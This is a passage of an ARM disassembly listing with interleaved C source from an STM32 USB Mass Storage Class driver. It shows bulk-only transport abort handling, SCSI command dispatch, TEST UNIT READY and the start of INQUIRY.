 800967a:	2b02      	cmp	r3, #2
 800967c:	d10d      	bne.n	800969a <MSC_BOT_Abort+0x7a>
  {
    (void)USBD_LL_StallEP(pdev, MSCInEpAdd);
 800967e:	4b09      	ldr	r3, [pc, #36]	; (80096a4 <MSC_BOT_Abort+0x84>)
 8009680:	781b      	ldrb	r3, [r3, #0]
 8009682:	4619      	mov	r1, r3
 8009684:	6878      	ldr	r0, [r7, #4]
 8009686:	f003 fa97 	bl	800cbb8 <USBD_LL_StallEP>
    (void)USBD_LL_StallEP(pdev, MSCOutEpAdd);
 800968a:	4b05      	ldr	r3, [pc, #20]	; (80096a0 <MSC_BOT_Abort+0x80>)
 800968c:	781b      	ldrb	r3, [r3, #0]
 800968e:	4619      	mov	r1, r3
 8009690:	6878      	ldr	r0, [r7, #4]
 8009692:	f003 fa91 	bl	800cbb8 <USBD_LL_StallEP>
 8009696:	e000      	b.n	800969a <MSC_BOT_Abort+0x7a>
    return;
 8009698:	bf00      	nop
  }
}
 800969a:	3710      	adds	r7, #16
 800969c:	46bd      	mov	sp, r7
 800969e:	bd80      	pop	{r7, pc}
 80096a0:	2000010b 	.word	0x2000010b
 80096a4:	2000010a 	.word	0x2000010a

080096a8 <MSC_BOT_CplClrFeature>:
  * @param  epnum: endpoint index
  * @retval None
  */

void  MSC_BOT_CplClrFeature(USBD_HandleTypeDef *pdev, uint8_t epnum)
{
 80096a8:	b580      	push	{r7, lr}
 80096aa:	b084      	sub	sp, #16
 80096ac:	af00      	add	r7, sp, #0
 80096ae:	6078      	str	r0, [r7, #4]
 80096b0:	460b      	mov	r3, r1
 80096b2:	70fb      	strb	r3, [r7, #3]
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 80096b4:	687b      	ldr	r3, [r7, #4]
 80096b6:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 80096ba:	687b      	ldr	r3, [r7, #4]
 80096bc:	32b0      	adds	r2, #176	; 0xb0
 80096be:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 80096c2:	60fb      	str	r3, [r7, #12]
  /* Get the Endpoints addresses allocated for this class instance */
  MSCInEpAdd  = USBD_CoreGetEPAdd(pdev, USBD_EP_IN, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
  MSCOutEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_OUT, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
#endif /* USE_USBD_COMPOSITE */

  if (hmsc == NULL)
 80096c4:	68fb      	ldr	r3, [r7, #12]
 80096c6:	2b00      	cmp	r3, #0
 80096c8:	d01d      	beq.n	8009706 <MSC_BOT_CplClrFeature+0x5e>
  {
    return;
  }

  if (hmsc->bot_status == USBD_BOT_STATUS_ERROR) /* Bad CBW Signature */
 80096ca:	68fb      	ldr	r3, [r7, #12]
 80096cc:	7a5b      	ldrb	r3, [r3, #9]
 80096ce:	2b02      	cmp	r3, #2
 80096d0:	d10c      	bne.n	80096ec <MSC_BOT_CplClrFeature+0x44>
  {
    (void)USBD_LL_StallEP(pdev, MSCInEpAdd);
 80096d2:	4b10      	ldr	r3, [pc, #64]	; (8009714 <MSC_BOT_CplClrFeature+0x6c>)
 80096d4:	781b      	ldrb	r3, [r3, #0]
 80096d6:	4619      	mov	r1, r3
 80096d8:	6878      	ldr	r0, [r7, #4]
 80096da:	f003 fa6d 	bl	800cbb8 <USBD_LL_StallEP>
    (void)USBD_LL_StallEP(pdev, MSCOutEpAdd);
 80096de:	4b0e      	ldr	r3, [pc, #56]	; (8009718 <MSC_BOT_CplClrFeature+0x70>)
 80096e0:	781b      	ldrb	r3, [r3, #0]
 80096e2:	4619      	mov	r1, r3
 80096e4:	6878      	ldr	r0, [r7, #4]
 80096e6:	f003 fa67 	bl	800cbb8 <USBD_LL_StallEP>
 80096ea:	e00f      	b.n	800970c <MSC_BOT_CplClrFeature+0x64>
  }
  else if (((epnum & 0x80U) == 0x80U) && (hmsc->bot_status != USBD_BOT_STATUS_RECOVERY))
 80096ec:	f997 3003 	ldrsb.w	r3, [r7, #3]
 80096f0:	2b00      	cmp	r3, #0
 80096f2:	da0a      	bge.n	800970a <MSC_BOT_CplClrFeature+0x62>
 80096f4:	68fb      	ldr	r3, [r7, #12]
 80096f6:	7a5b      	ldrb	r3, [r3, #9]
 80096f8:	2b01      	cmp	r3, #1
 80096fa:	d006      	beq.n	800970a <MSC_BOT_CplClrFeature+0x62>
  {
    MSC_BOT_SendCSW(pdev, USBD_CSW_CMD_FAILED);
 80096fc:	2101      	movs	r1, #1
 80096fe:	6878      	ldr	r0, [r7, #4]
 8009700:	f7ff ff4e 	bl	80095a0 <MSC_BOT_SendCSW>
 8009704:	e002      	b.n	800970c <MSC_BOT_CplClrFeature+0x64>
    return;
 8009706:	bf00      	nop
 8009708:	e000      	b.n	800970c <MSC_BOT_CplClrFeature+0x64>
  }
  else
  {
    return;
 800970a:	bf00      	nop
  }
}
 800970c:	3710      	adds	r7, #16
 800970e:	46bd      	mov	sp, r7
 8009710:	bd80      	pop	{r7, pc}
 8009712:	bf00      	nop
 8009714:	2000010a 	.word	0x2000010a
 8009718:	2000010b 	.word	0x2000010b

0800971c <SCSI_ProcessCmd>:
  * @param  lun: Logical unit number
  * @param  params: Command parameters
  * @retval status
  */
int8_t SCSI_ProcessCmd(USBD_HandleTypeDef *pdev, uint8_t lun, uint8_t *cmd)
{
 800971c:	b580      	push	{r7, lr}
 800971e:	b086      	sub	sp, #24
 8009720:	af00      	add	r7, sp, #0
 8009722:	60f8      	str	r0, [r7, #12]
 8009724:	460b      	mov	r3, r1
 8009726:	607a      	str	r2, [r7, #4]
 8009728:	72fb      	strb	r3, [r7, #11]
  int8_t ret;
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 800972a:	68fb      	ldr	r3, [r7, #12]
 800972c:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8009730:	68fb      	ldr	r3, [r7, #12]
 8009732:	32b0      	adds	r2, #176	; 0xb0
 8009734:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8009738:	613b      	str	r3, [r7, #16]

  if (hmsc == NULL)
 800973a:	693b      	ldr	r3, [r7, #16]
 800973c:	2b00      	cmp	r3, #0
 800973e:	d102      	bne.n	8009746 <SCSI_ProcessCmd+0x2a>
  {
    return -1;
 8009740:	f04f 33ff 	mov.w	r3, #4294967295
 8009744:	e168      	b.n	8009a18 <SCSI_ProcessCmd+0x2fc>
  }

  switch (cmd[0])
 8009746:	687b      	ldr	r3, [r7, #4]
 8009748:	781b      	ldrb	r3, [r3, #0]
 800974a:	2baa      	cmp	r3, #170	; 0xaa
 800974c:	f000 8144 	beq.w	80099d8 <SCSI_ProcessCmd+0x2bc>
 8009750:	2baa      	cmp	r3, #170	; 0xaa
 8009752:	f300 8153 	bgt.w	80099fc <SCSI_ProcessCmd+0x2e0>
 8009756:	2ba8      	cmp	r3, #168	; 0xa8
 8009758:	f000 812c 	beq.w	80099b4 <SCSI_ProcessCmd+0x298>
 800975c:	2ba8      	cmp	r3, #168	; 0xa8
 800975e:	f300 814d 	bgt.w	80099fc <SCSI_ProcessCmd+0x2e0>
 8009762:	2b5a      	cmp	r3, #90	; 0x5a
 8009764:	f300 80c0 	bgt.w	80098e8 <SCSI_ProcessCmd+0x1cc>
 8009768:	2b00      	cmp	r3, #0
 800976a:	f2c0 8147 	blt.w	80099fc <SCSI_ProcessCmd+0x2e0>
 800976e:	2b5a      	cmp	r3, #90	; 0x5a
 8009770:	f200 8144 	bhi.w	80099fc <SCSI_ProcessCmd+0x2e0>
 8009774:	a201      	add	r2, pc, #4	; (adr r2, 800977c <SCSI_ProcessCmd+0x60>)
 8009776:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 800977a:	bf00      	nop
 800977c:	080098ef 	.word	0x080098ef
 8009780:	080099fd 	.word	0x080099fd
 8009784:	080099fd 	.word	0x080099fd
 8009788:	08009901 	.word	0x08009901
 800978c:	080099fd 	.word	0x080099fd
 8009790:	080099fd 	.word	0x080099fd
 8009794:	080099fd 	.word	0x080099fd
 8009798:	080099fd 	.word	0x080099fd
 800979c:	080099fd 	.word	0x080099fd
 80097a0:	080099fd 	.word	0x080099fd
 80097a4:	080099fd 	.word	0x080099fd
 80097a8:	080099fd 	.word	0x080099fd
 80097ac:	080099fd 	.word	0x080099fd
 80097b0:	080099fd 	.word	0x080099fd
 80097b4:	080099fd 	.word	0x080099fd
 80097b8:	080099fd 	.word	0x080099fd
 80097bc:	080099fd 	.word	0x080099fd
 80097c0:	080099fd 	.word	0x080099fd
 80097c4:	08009913 	.word	0x08009913
 80097c8:	080099fd 	.word	0x080099fd
 80097cc:	080099fd 	.word	0x080099fd
 80097d0:	080099fd 	.word	0x080099fd
 80097d4:	080099fd 	.word	0x080099fd
 80097d8:	080099fd 	.word	0x080099fd
 80097dc:	080099fd 	.word	0x080099fd
 80097e0:	080099fd 	.word	0x080099fd
 80097e4:	08009949 	.word	0x08009949
 80097e8:	08009925 	.word	0x08009925
 80097ec:	080099fd 	.word	0x080099fd
 80097f0:	080099fd 	.word	0x080099fd
 80097f4:	08009937 	.word	0x08009937
 80097f8:	080099fd 	.word	0x080099fd
 80097fc:	080099fd 	.word	0x080099fd
 8009800:	080099fd 	.word	0x080099fd
 8009804:	080099fd 	.word	0x080099fd
 8009808:	0800996d 	.word	0x0800996d
 800980c:	080099fd 	.word	0x080099fd
 8009810:	0800997f 	.word	0x0800997f
 8009814:	080099fd 	.word	0x080099fd
 8009818:	080099fd 	.word	0x080099fd
 800981c:	080099a3 	.word	0x080099a3
 8009820:	080099fd 	.word	0x080099fd
 8009824:	080099c7 	.word	0x080099c7
 8009828:	080099fd 	.word	0x080099fd
 800982c:	080099fd 	.word	0x080099fd
 8009830:	080099fd 	.word	0x080099fd
 8009834:	080099fd 	.word	0x080099fd
 8009838:	080099eb 	.word	0x080099eb
 800983c:	080099fd 	.word	0x080099fd
 8009840:	080099fd 	.word	0x080099fd
 8009844:	080099fd 	.word	0x080099fd
 8009848:	080099fd 	.word	0x080099fd
 800984c:	080099fd 	.word	0x080099fd
 8009850:	080099fd 	.word	0x080099fd
 8009854:	080099fd 	.word	0x080099fd
 8009858:	080099fd 	.word	0x080099fd
 800985c:	080099fd 	.word	0x080099fd
 8009860:	080099fd 	.word	0x080099fd
 8009864:	080099fd 	.word	0x080099fd
 8009868:	080099fd 	.word	0x080099fd
 800986c:	080099fd 	.word	0x080099fd
 8009870:	080099fd 	.word	0x080099fd
 8009874:	080099fd 	.word	0x080099fd
 8009878:	080099fd 	.word	0x080099fd
 800987c:	080099fd 	.word	0x080099fd
 8009880:	080099fd 	.word	0x080099fd
 8009884:	080099fd 	.word	0x080099fd
 8009888:	080099fd 	.word	0x080099fd
 800988c:	080099fd 	.word	0x080099fd
 8009890:	080099fd 	.word	0x080099fd
 8009894:	080099fd 	.word	0x080099fd
 8009898:	080099fd 	.word	0x080099fd
 800989c:	080099fd 	.word	0x080099fd
 80098a0:	080099fd 	.word	0x080099fd
 80098a4:	080099fd 	.word	0x080099fd
 80098a8:	080099fd 	.word	0x080099fd
 80098ac:	080099fd 	.word	0x080099fd
 80098b0:	080099fd 	.word	0x080099fd
 80098b4:	080099fd 	.word	0x080099fd
 80098b8:	080099fd 	.word	0x080099fd
 80098bc:	080099fd 	.word	0x080099fd
 80098c0:	080099fd 	.word	0x080099fd
 80098c4:	080099fd 	.word	0x080099fd
 80098c8:	080099fd 	.word	0x080099fd
 80098cc:	080099fd 	.word	0x080099fd
 80098d0:	080099fd 	.word	0x080099fd
 80098d4:	080099fd 	.word	0x080099fd
 80098d8:	080099fd 	.word	0x080099fd
 80098dc:	080099fd 	.word	0x080099fd
 80098e0:	080099fd 	.word	0x080099fd
 80098e4:	0800995b 	.word	0x0800995b
 80098e8:	2b9e      	cmp	r3, #158	; 0x9e
 80098ea:	d051      	beq.n	8009990 <SCSI_ProcessCmd+0x274>
 80098ec:	e086      	b.n	80099fc <SCSI_ProcessCmd+0x2e0>
  {
    case SCSI_TEST_UNIT_READY:
      ret = SCSI_TestUnitReady(pdev, lun, cmd);
 80098ee:	7afb      	ldrb	r3, [r7, #11]
 80098f0:	687a      	ldr	r2, [r7, #4]
 80098f2:	4619      	mov	r1, r3
 80098f4:	68f8      	ldr	r0, [r7, #12]
 80098f6:	f000 f893 	bl	8009a20 <SCSI_TestUnitReady>
 80098fa:	4603      	mov	r3, r0
 80098fc:	75fb      	strb	r3, [r7, #23]
      break;
 80098fe:	e089      	b.n	8009a14 <SCSI_ProcessCmd+0x2f8>

    case SCSI_REQUEST_SENSE:
      ret = SCSI_RequestSense(pdev, lun, cmd);
 8009900:	7afb      	ldrb	r3, [r7, #11]
 8009902:	687a      	ldr	r2, [r7, #4]
 8009904:	4619      	mov	r1, r3
 8009906:	68f8      	ldr	r0, [r7, #12]
 8009908:	f000 fb9a 	bl	800a040 <SCSI_RequestSense>
 800990c:	4603      	mov	r3, r0
 800990e:	75fb      	strb	r3, [r7, #23]
      break;
 8009910:	e080      	b.n	8009a14 <SCSI_ProcessCmd+0x2f8>

    case SCSI_INQUIRY:
      ret = SCSI_Inquiry(pdev, lun, cmd);
 8009912:	7afb      	ldrb	r3, [r7, #11]
 8009914:	687a      	ldr	r2, [r7, #4]
 8009916:	4619      	mov	r1, r3
 8009918:	68f8      	ldr	r0, [r7, #12]
 800991a:	f000 f8df 	bl	8009adc <SCSI_Inquiry>
 800991e:	4603      	mov	r3, r0
 8009920:	75fb      	strb	r3, [r7, #23]
      break;
 8009922:	e077      	b.n	8009a14 <SCSI_ProcessCmd+0x2f8>

    case SCSI_START_STOP_UNIT:
      ret = SCSI_StartStopUnit(pdev, lun, cmd);
 8009924:	7afb      	ldrb	r3, [r7, #11]
 8009926:	687a      	ldr	r2, [r7, #4]
 8009928:	4619      	mov	r1, r3
 800992a:	68f8      	ldr	r0, [r7, #12]
 800992c:	f000 fc7e 	bl	800a22c <SCSI_StartStopUnit>
 8009930:	4603      	mov	r3, r0
 8009932:	75fb      	strb	r3, [r7, #23]
      break;
 8009934:	e06e      	b.n	8009a14 <SCSI_ProcessCmd+0x2f8>

    case SCSI_ALLOW_MEDIUM_REMOVAL:
      ret = SCSI_AllowPreventRemovable(pdev, lun, cmd);
 8009936:	7afb      	ldrb	r3, [r7, #11]
 8009938:	687a      	ldr	r2, [r7, #4]
 800993a:	4619      	mov	r1, r3
 800993c:	68f8      	ldr	r0, [r7, #12]
 800993e:	f000 fcd2 	bl	800a2e6 <SCSI_AllowPreventRemovable>
 8009942:	4603      	mov	r3, r0
 8009944:	75fb      	strb	r3, [r7, #23]
      break;
 8009946:	e065      	b.n	8009a14 <SCSI_ProcessCmd+0x2f8>

    case SCSI_MODE_SENSE6:
      ret = SCSI_ModeSense6(pdev, lun, cmd);
 8009948:	7afb      	ldrb	r3, [r7, #11]
 800994a:	687a      	ldr	r2, [r7, #4]
 800994c:	4619      	mov	r1, r3
 800994e:	68f8      	ldr	r0, [r7, #12]
 8009950:	f000 fb16 	bl	8009f80 <SCSI_ModeSense6>
 8009954:	4603      	mov	r3, r0
 8009956:	75fb      	strb	r3, [r7, #23]
      break;
 8009958:	e05c      	b.n	8009a14 <SCSI_ProcessCmd+0x2f8>

    case SCSI_MODE_SENSE10:
      ret = SCSI_ModeSense10(pdev, lun, cmd);
 800995a:	7afb      	ldrb	r3, [r7, #11]
 800995c:	687a      	ldr	r2, [r7, #4]
 800995e:	4619      	mov	r1, r3
 8009960:	68f8      	ldr	r0, [r7, #12]
 8009962:	f000 fb3d 	bl	8009fe0 <SCSI_ModeSense10>
 8009966:	4603      	mov	r3, r0
 8009968:	75fb      	strb	r3, [r7, #23]
      break;
 800996a:	e053      	b.n	8009a14 <SCSI_ProcessCmd+0x2f8>

    case SCSI_READ_FORMAT_CAPACITIES:
      ret = SCSI_ReadFormatCapacity(pdev, lun, cmd);
 800996c:	7afb      	ldrb	r3, [r7, #11]
 800996e:	687a      	ldr	r2, [r7, #4]
 8009970:	4619      	mov	r1, r3
 8009972:	68f8      	ldr	r0, [r7, #12]
 8009974:	f000 fa86 	bl	8009e84 <SCSI_ReadFormatCapacity>
 8009978:	4603      	mov	r3, r0
 800997a:	75fb      	strb	r3, [r7, #23]
      break;
 800997c:	e04a      	b.n	8009a14 <SCSI_ProcessCmd+0x2f8>

    case SCSI_READ_CAPACITY10:
      ret = SCSI_ReadCapacity10(pdev, lun, cmd);
 800997e:	7afb      	ldrb	r3, [r7, #11]
 8009980:	687a      	ldr	r2, [r7, #4]
 8009982:	4619      	mov	r1, r3
 8009984:	68f8      	ldr	r0, [r7, #12]
 8009986:	f000 f929 	bl	8009bdc <SCSI_ReadCapacity10>
 800998a:	4603      	mov	r3, r0
 800998c:	75fb      	strb	r3, [r7, #23]
      break;
 800998e:	e041      	b.n	8009a14 <SCSI_ProcessCmd+0x2f8>

    case SCSI_READ_CAPACITY16:
      ret = SCSI_ReadCapacity16(pdev, lun, cmd);
 8009990:	7afb      	ldrb	r3, [r7, #11]
 8009992:	687a      	ldr	r2, [r7, #4]
 8009994:	4619      	mov	r1, r3
 8009996:	68f8      	ldr	r0, [r7, #12]
 8009998:	f000 f9af 	bl	8009cfa <SCSI_ReadCapacity16>
 800999c:	4603      	mov	r3, r0
 800999e:	75fb      	strb	r3, [r7, #23]
      break;
 80099a0:	e038      	b.n	8009a14 <SCSI_ProcessCmd+0x2f8>

    case SCSI_READ10:
      ret = SCSI_Read10(pdev, lun, cmd);
 80099a2:	7afb      	ldrb	r3, [r7, #11]
 80099a4:	687a      	ldr	r2, [r7, #4]
 80099a6:	4619      	mov	r1, r3
 80099a8:	68f8      	ldr	r0, [r7, #12]
 80099aa:	f000 fccd 	bl	800a348 <SCSI_Read10>
 80099ae:	4603      	mov	r3, r0
 80099b0:	75fb      	strb	r3, [r7, #23]
      break;
 80099b2:	e02f      	b.n	8009a14 <SCSI_ProcessCmd+0x2f8>

    case SCSI_READ12:
      ret = SCSI_Read12(pdev, lun, cmd);
 80099b4:	7afb      	ldrb	r3, [r7, #11]
 80099b6:	687a      	ldr	r2, [r7, #4]
 80099b8:	4619      	mov	r1, r3
 80099ba:	68f8      	ldr	r0, [r7, #12]
 80099bc:	f000 fd7b 	bl	800a4b6 <SCSI_Read12>
 80099c0:	4603      	mov	r3, r0
 80099c2:	75fb      	strb	r3, [r7, #23]
      break;
 80099c4:	e026      	b.n	8009a14 <SCSI_ProcessCmd+0x2f8>

    case SCSI_WRITE10:
      ret = SCSI_Write10(pdev, lun, cmd);
 80099c6:	7afb      	ldrb	r3, [r7, #11]
 80099c8:	687a      	ldr	r2, [r7, #4]
 80099ca:	4619      	mov	r1, r3
 80099cc:	68f8      	ldr	r0, [r7, #12]
 80099ce:	f000 fe33 	bl	800a638 <SCSI_Write10>
 80099d2:	4603      	mov	r3, r0
 80099d4:	75fb      	strb	r3, [r7, #23]
      break;
 80099d6:	e01d      	b.n	8009a14 <SCSI_ProcessCmd+0x2f8>

    case SCSI_WRITE12:
      ret = SCSI_Write12(pdev, lun, cmd);
 80099d8:	7afb      	ldrb	r3, [r7, #11]
 80099da:	687a      	ldr	r2, [r7, #4]
 80099dc:	4619      	mov	r1, r3
 80099de:	68f8      	ldr	r0, [r7, #12]
 80099e0:	f000 ff0e 	bl	800a800 <SCSI_Write12>
 80099e4:	4603      	mov	r3, r0
 80099e6:	75fb      	strb	r3, [r7, #23]
      break;
 80099e8:	e014      	b.n	8009a14 <SCSI_ProcessCmd+0x2f8>

    case SCSI_VERIFY10:
      ret = SCSI_Verify10(pdev, lun, cmd);
 80099ea:	7afb      	ldrb	r3, [r7, #11]
 80099ec:	687a      	ldr	r2, [r7, #4]
 80099ee:	4619      	mov	r1, r3
 80099f0:	68f8      	ldr	r0, [r7, #12]
 80099f2:	f000 fff9 	bl	800a9e8 <SCSI_Verify10>
 80099f6:	4603      	mov	r3, r0
 80099f8:	75fb      	strb	r3, [r7, #23]
      break;
 80099fa:	e00b      	b.n	8009a14 <SCSI_ProcessCmd+0x2f8>

    default:
      SCSI_SenseCode(pdev, lun, ILLEGAL_REQUEST, INVALID_CDB);
 80099fc:	7af9      	ldrb	r1, [r7, #11]
 80099fe:	2320      	movs	r3, #32
 8009a00:	2205      	movs	r2, #5
 8009a02:	68f8      	ldr	r0, [r7, #12]
 8009a04:	f000 fbb6 	bl	800a174 <SCSI_SenseCode>
      hmsc->bot_status = USBD_BOT_STATUS_ERROR;
 8009a08:	693b      	ldr	r3, [r7, #16]
 8009a0a:	2202      	movs	r2, #2
 8009a0c:	725a      	strb	r2, [r3, #9]
      ret = -1;
 8009a0e:	23ff      	movs	r3, #255	; 0xff
 8009a10:	75fb      	strb	r3, [r7, #23]
      break;
 8009a12:	bf00      	nop
  }

  return ret;
 8009a14:	f997 3017 	ldrsb.w	r3, [r7, #23]
}
 8009a18:	4618      	mov	r0, r3
 8009a1a:	3718      	adds	r7, #24
 8009a1c:	46bd      	mov	sp, r7
 8009a1e:	bd80      	pop	{r7, pc}

08009a20 <SCSI_TestUnitReady>:
  * @param  lun: Logical unit number
  * @param  params: Command parameters
  * @retval status
  */
static int8_t SCSI_TestUnitReady(USBD_HandleTypeDef *pdev, uint8_t lun, uint8_t *params)
{
 8009a20:	b580      	push	{r7, lr}
 8009a22:	b086      	sub	sp, #24
 8009a24:	af00      	add	r7, sp, #0
 8009a26:	60f8      	str	r0, [r7, #12]
 8009a28:	460b      	mov	r3, r1
 8009a2a:	607a      	str	r2, [r7, #4]
 8009a2c:	72fb      	strb	r3, [r7, #11]
  UNUSED(params);
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 8009a2e:	68fb      	ldr	r3, [r7, #12]
 8009a30:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8009a34:	68fb      	ldr	r3, [r7, #12]
 8009a36:	32b0      	adds	r2, #176	; 0xb0
 8009a38:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8009a3c:	617b      	str	r3, [r7, #20]

  if (hmsc == NULL)
 8009a3e:	697b      	ldr	r3, [r7, #20]
 8009a40:	2b00      	cmp	r3, #0
 8009a42:	d102      	bne.n	8009a4a <SCSI_TestUnitReady+0x2a>
  {
    return -1;
 8009a44:	f04f 33ff 	mov.w	r3, #4294967295
 8009a48:	e043      	b.n	8009ad2 <SCSI_TestUnitReady+0xb2>
  }

  /* case 9 : Hi > D0 */
  if (hmsc->cbw.dDataLength != 0U)
 8009a4a:	697b      	ldr	r3, [r7, #20]
 8009a4c:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009a50:	699b      	ldr	r3, [r3, #24]
 8009a52:	2b00      	cmp	r3, #0
 8009a54:	d00b      	beq.n	8009a6e <SCSI_TestUnitReady+0x4e>
  {
    SCSI_SenseCode(pdev, hmsc->cbw.bLUN, ILLEGAL_REQUEST, INVALID_CDB);
 8009a56:	697b      	ldr	r3, [r7, #20]
 8009a58:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009a5c:	7f59      	ldrb	r1, [r3, #29]
 8009a5e:	2320      	movs	r3, #32
 8009a60:	2205      	movs	r2, #5
 8009a62:	68f8      	ldr	r0, [r7, #12]
 8009a64:	f000 fb86 	bl	800a174 <SCSI_SenseCode>

    return -1;
 8009a68:	f04f 33ff 	mov.w	r3, #4294967295
 8009a6c:	e031      	b.n	8009ad2 <SCSI_TestUnitReady+0xb2>
  }

  if (hmsc->scsi_medium_state == SCSI_MEDIUM_EJECTED)
 8009a6e:	697b      	ldr	r3, [r7, #20]
 8009a70:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009a74:	f893 3062 	ldrb.w	r3, [r3, #98]	; 0x62
 8009a78:	2b02      	cmp	r3, #2
 8009a7a:	d10b      	bne.n	8009a94 <SCSI_TestUnitReady+0x74>
  {
    SCSI_SenseCode(pdev, lun, NOT_READY, MEDIUM_NOT_PRESENT);
 8009a7c:	7af9      	ldrb	r1, [r7, #11]
 8009a7e:	233a      	movs	r3, #58	; 0x3a
 8009a80:	2202      	movs	r2, #2
 8009a82:	68f8      	ldr	r0, [r7, #12]
 8009a84:	f000 fb76 	bl	800a174 <SCSI_SenseCode>
    hmsc->bot_state = USBD_BOT_NO_DATA;
 8009a88:	697b      	ldr	r3, [r7, #20]
 8009a8a:	2205      	movs	r2, #5
 8009a8c:	721a      	strb	r2, [r3, #8]
    return -1;
 8009a8e:	f04f 33ff 	mov.w	r3, #4294967295
 8009a92:	e01e      	b.n	8009ad2 <SCSI_TestUnitReady+0xb2>
  }

  if (((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId])->IsReady(lun) != 0)
 8009a94:	68fb      	ldr	r3, [r7, #12]
 8009a96:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 8009a9a:	68fa      	ldr	r2, [r7, #12]
 8009a9c:	33b0      	adds	r3, #176	; 0xb0
 8009a9e:	009b      	lsls	r3, r3, #2
 8009aa0:	4413      	add	r3, r2
 8009aa2:	685b      	ldr	r3, [r3, #4]
 8009aa4:	689b      	ldr	r3, [r3, #8]
 8009aa6:	7afa      	ldrb	r2, [r7, #11]
 8009aa8:	4610      	mov	r0, r2
 8009aaa:	4798      	blx	r3
 8009aac:	4603      	mov	r3, r0
 8009aae:	2b00      	cmp	r3, #0
 8009ab0:	d00b      	beq.n	8009aca <SCSI_TestUnitReady+0xaa>
  {
    SCSI_SenseCode(pdev, lun, NOT_READY, MEDIUM_NOT_PRESENT);
 8009ab2:	7af9      	ldrb	r1, [r7, #11]
 8009ab4:	233a      	movs	r3, #58	; 0x3a
 8009ab6:	2202      	movs	r2, #2
 8009ab8:	68f8      	ldr	r0, [r7, #12]
 8009aba:	f000 fb5b 	bl	800a174 <SCSI_SenseCode>
    hmsc->bot_state = USBD_BOT_NO_DATA;
 8009abe:	697b      	ldr	r3, [r7, #20]
 8009ac0:	2205      	movs	r2, #5
 8009ac2:	721a      	strb	r2, [r3, #8]

    return -1;
 8009ac4:	f04f 33ff 	mov.w	r3, #4294967295
 8009ac8:	e003      	b.n	8009ad2 <SCSI_TestUnitReady+0xb2>
  }
  hmsc->bot_data_length = 0U;
 8009aca:	697b      	ldr	r3, [r7, #20]
 8009acc:	2200      	movs	r2, #0
 8009ace:	60da      	str	r2, [r3, #12]

  return 0;
 8009ad0:	2300      	movs	r3, #0
}
 8009ad2:	4618      	mov	r0, r3
 8009ad4:	3718      	adds	r7, #24
 8009ad6:	46bd      	mov	sp, r7
 8009ad8:	bd80      	pop	{r7, pc}
	...

08009adc <SCSI_Inquiry>:
  * @param  lun: Logical unit number
  * @param  params: Command parameters
  * @retval status
  */
static int8_t SCSI_Inquiry(USBD_HandleTypeDef *pdev, uint8_t lun, uint8_t *params)
{
 8009adc:	b580      	push	{r7, lr}
 8009ade:	b088      	sub	sp, #32
 8009ae0:	af00      	add	r7, sp, #0
 8009ae2:	60f8      	str	r0, [r7, #12]
 8009ae4:	460b      	mov	r3, r1
 8009ae6:	607a      	str	r2, [r7, #4]
 8009ae8:	72fb      	strb	r3, [r7, #11]
  uint8_t *pPage;
  uint16_t len;
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 8009aea:	68fb      	ldr	r3, [r7, #12]
 8009aec:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8009af0:	68fb      	ldr	r3, [r7, #12]
 8009af2:	32b0      	adds	r2, #176	; 0xb0
 8009af4:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8009af8:	61bb      	str	r3, [r7, #24]

  if (hmsc == NULL)
 8009afa:	69bb      	ldr	r3, [r7, #24]
 8009afc:	2b00      	cmp	r3, #0
 8009afe:	d102      	bne.n	8009b06 <SCSI_Inquiry+0x2a>
  {
    return -1;
 8009b00:	f04f 33ff 	mov.w	r3, #4294967295
 8009b04:	e062      	b.n	8009bcc <SCSI_Inquiry+0xf0>
  }

  if (hmsc->cbw.dDataLength == 0U)
 8009b06:	69bb      	ldr	r3, [r7, #24]
 8009b08:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009b0c:	699b      	ldr	r3, [r3, #24]
 8009b0e:	2b00      	cmp	r3, #0
 8009b10:	d10b      	bne.n	8009b2a <SCSI_Inquiry+0x4e>
  {
    SCSI_SenseCode(pdev, hmsc->cbw.bLUN, ILLEGAL_REQUEST, INVALID_CDB);
 8009b12:	69bb      	ldr	r3, [r7, #24]
 8009b14:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009b18:	7f59      	ldrb	r1, [r3, #29]
 8009b1a:	2320      	movs	r3, #32
 8009b1c:	2205      	movs	r2, #5
 8009b1e:	68f8      	ldr	r0, [r7, #12]
 8009b20:	f000 fb28 	bl	800a174 <SCSI_SenseCode>
    return -1;
 8009b24:	f04f 33ff 	mov.w	r3, #4294967295
 8009b28:	e050      	b.n	8009bcc <SCSI_Inquiry+0xf0>
  }

  if ((params[1] & 0x01U) != 0U) /* Evpd is set */
 8009b2a:	687b      	ldr	r3, [r7, #4]
 8009b2c:	3301      	adds	r3, #1
 8009b2e:	781b      	ldrb	r3, [r3, #0]
 8009b30:	f003 0301 	and.w	r3, r3, #1
 8009b34:	2b00      	cmp	r3, #0
 8009b36:	d021      	beq.n	8009b7c <SCSI_Inquiry+0xa0>
  {
